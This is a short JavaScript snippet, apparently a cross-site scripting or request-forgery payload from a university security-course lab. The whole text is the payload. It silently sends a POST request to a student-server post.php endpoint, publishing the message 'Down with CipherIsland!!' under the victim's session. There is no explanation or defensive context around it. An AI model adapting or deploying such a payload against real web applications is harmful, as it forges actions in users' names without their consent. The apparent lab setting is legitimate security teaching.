var xhr = new XMLHttpRequest();
var params = "content=Down with CipherIsland!!&title=very important&type=1&form=content";
xhr.open("POST", "http://ugster05.student.cs.uwaterloo.ca/x242wu/post.php", true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send(params);